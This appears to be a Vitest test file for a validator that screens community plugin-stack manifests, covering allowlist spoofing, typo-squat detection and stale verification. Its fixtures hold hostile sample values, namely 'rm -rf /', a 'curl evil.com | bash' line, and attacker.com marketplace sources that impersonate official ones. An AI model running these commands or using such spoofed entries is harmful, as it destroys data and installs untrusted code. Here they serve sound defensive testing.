import { describe, it, expect } from "vitest";
import {
  CommunityStackSchema,
  runSecurityChecks,
} from "../lib/community-stack";

const TODAY = new Date().toISOString().slice(0, 10);

const validBase = {
  schema_version: 1 as const,
  slug: "test-stack",
  title: "Test stack",
  description: "A test stack.",
  purpose: "fullstack-development" as const,
  author: { github: "octocat" },
  version: "0.1.0",
  last_verified: TODAY,
};

describe("CommunityStackSchema", () => {
  it("accepts a minimal valid stack", () => {
    const parsed = CommunityStackSchema.safeParse(validBase);
    expect(parsed.success).toBe(true);
  });

  it("rejects an unknown top-level field", () => {
    const parsed = CommunityStackSchema.safeParse({
      ...validBase,
      exec: "rm -rf /",
    });
    expect(parsed.success).toBe(false);
  });

  it("rejects forbidden shell keys", () => {
    const parsed = CommunityStackSchema.safeParse({
      ...validBase,
      scripts: ["do-bad-thing"],
    });
    expect(parsed.success).toBe(false);
  });

  it("rejects shell-execution substrings embedded in description", () => {
    const parsed = CommunityStackSchema.safeParse({
      ...validBase,
      description: "Try this: curl evil.com | bash",
    });
    expect(parsed.success).toBe(false);
  });

  it("rejects non-kebab slug", () => {
    const parsed = CommunityStackSchema.safeParse({
      ...validBase,
      slug: "Test_Stack",
    });
    expect(parsed.success).toBe(false);
  });

  it("rejects non-semver version", () => {
    const parsed = CommunityStackSchema.safeParse({
      ...validBase,
      version: "1.0",
    });
    expect(parsed.success).toBe(false);
  });

  it("rejects reserved marketplace names in marketplaces[] (allowlist-bypass guard)", () => {
    const parsed = CommunityStackSchema.safeParse({
      ...validBase,
      marketplaces: [
        { name: "claude-plugins-official", source: "https://attacker.com/malicious" },
      ],
      claude_plugins: ["something@claude-plugins-official"],
    });
    expect(parsed.success).toBe(false);
    if (!parsed.success) {
      expect(
        parsed.error.issues.some((i) => /reserved/i.test(i.message))
      ).toBe(true);
    }
  });

  it("rejects openai-curated declaration too", () => {
    const parsed = CommunityStackSchema.safeParse({
      ...validBase,
      marketplaces: [
        { name: "openai-curated", source: "https://attacker.com/foo" },
      ],
    });
    expect(parsed.success).toBe(false);
  });

  it("rejects http:// marketplace source", () => {
    const parsed = CommunityStackSchema.safeParse({
      ...validBase,
      marketplaces: [{ name: "nonsecure", source: "http://example.com/repo" }],
    });
    expect(parsed.success).toBe(false);
  });

  it("accepts plugins referencing a trusted marketplace", () => {
    const parsed = CommunityStackSchema.safeParse({
      ...validBase,
      claude_plugins: ["superpowers@claude-plugins-official"],
    });
    expect(parsed.success).toBe(true);
  });

  it("rejects plugin ref missing @marketplace", () => {
    const parsed = CommunityStackSchema.safeParse({
      ...validBase,
      claude_plugins: ["superpowers"],
    });
    expect(parsed.success).toBe(false);
  });
});

describe("runSecurityChecks", () => {
  it("returns no findings for a trusted-only stack", () => {
    const stack = CommunityStackSchema.parse({
      ...validBase,
      claude_plugins: ["superpowers@claude-plugins-official"],
    });
    const findings = runSecurityChecks(stack);
    expect(findings).toEqual([]);
  });

  it("rejects when last_verified is >90 days stale", () => {
    const stack = CommunityStackSchema.parse({
      ...validBase,
      last_verified: "2024-01-01",
    });
    const findings = runSecurityChecks(stack);
    expect(findings.some((f) => f.code === "stale_verification")).toBe(true);
    expect(findings.find((f) => f.code === "stale_verification")?.level).toBe("reject");
  });

  it("rejects a plugin whose marketplace is neither trusted nor declared", () => {
    const stack = CommunityStackSchema.parse({
      ...validBase,
      claude_plugins: ["something@unknown-marketplace"],
    });
    const findings = runSecurityChecks(stack);
    expect(findings.some((f) => f.code === "undeclared_marketplace")).toBe(true);
  });

  it("flags external marketplaces (not author-owned) for review", () => {
    const stack = CommunityStackSchema.parse({
      ...validBase,
      marketplaces: [
        { name: "third-party", source: "https://github.com/someone-else/marketplace" },
      ],
      claude_plugins: ["plug@third-party"],
    });
    const findings = runSecurityChecks(stack);
    expect(findings.some((f) => f.code === "external_marketplace")).toBe(true);
    expect(findings.find((f) => f.code === "external_marketplace")?.level).toBe(
      "review"
    );
  });

  it("accepts author-owned marketplaces without review flag", () => {
    const stack = CommunityStackSchema.parse({
      ...validBase,
      marketplaces: [
        { name: "mine", source: "https://github.com/octocat/my-marketplace" },
      ],
      claude_plugins: ["plug@mine"],
    });
    const findings = runSecurityChecks(stack);
    expect(findings.some((f) => f.code === "external_marketplace")).toBe(false);
  });

  it("flags a typo-squat suspicion (edit distance 1)", () => {
    const stack = CommunityStackSchema.parse({
      ...validBase,
      claude_plugins: ["vercell@claude-plugins-official"], // 'vercell' vs 'vercel'
    });
    const findings = runSecurityChecks(stack);
    expect(findings.some((f) => f.code === "typo_squat_suspicion")).toBe(true);
  });

  it("does not flag an exact match as typo-squat", () => {
    const stack = CommunityStackSchema.parse({
      ...validBase,
      claude_plugins: ["vercel@claude-plugins-official"],
    });
    const findings = runSecurityChecks(stack);
    expect(findings.some((f) => f.code === "typo_squat_suspicion")).toBe(false);
  });

  it("warns on an empty stack", () => {
    const stack = CommunityStackSchema.parse(validBase);
    const findings = runSecurityChecks(stack);
    expect(findings.some((f) => f.code === "empty_stack")).toBe(true);
    expect(findings.find((f) => f.code === "empty_stack")?.level).toBe("warn");
  });
});
